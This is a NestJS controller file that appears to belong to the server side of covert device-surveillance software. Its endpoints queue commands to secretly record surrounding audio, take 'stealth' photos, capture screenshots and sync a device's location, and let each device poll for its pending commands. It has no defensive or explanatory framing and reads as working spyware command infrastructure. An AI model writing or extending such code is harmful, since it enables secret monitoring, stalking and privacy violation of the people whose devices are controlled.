import { Controller, Get, Post, Body, Query, Param } from '@nestjs/common';
import { 
  CommandsService, 
  SurroundAudioCommandDto, 
  StealthPhotoCommandDto, 
  ScreenshotCommandDto, 
  SyncLocationCommandDto 
} from './commands.service';

@Controller('commands')
export class CommandsController {
  constructor(private readonly commandsService: CommandsService) {}

  @Post('surround-audio')
  async triggerSurroundAudio(@Body() dto: SurroundAudioCommandDto) {
    return this.commandsService.triggerSurroundAudio(dto);
  }

  @Post('stealth-photo')
  async triggerStealthPhoto(@Body() dto: StealthPhotoCommandDto) {
    return this.commandsService.triggerStealthPhoto(dto);
  }

  @Post('screenshot')
  async triggerScreenshot(@Body() dto: ScreenshotCommandDto) {
    return this.commandsService.triggerScreenshot(dto);
  }

  @Post('sync-location')
  async triggerLocationSync(@Body() dto: SyncLocationCommandDto) {
    return this.commandsService.triggerLocationSync(dto);
  }

  @Get('pending/:deviceId')
  async getPendingCommands(@Param('deviceId') deviceId: string) {
    return this.commandsService.getPendingCommands(deviceId);
  }
}
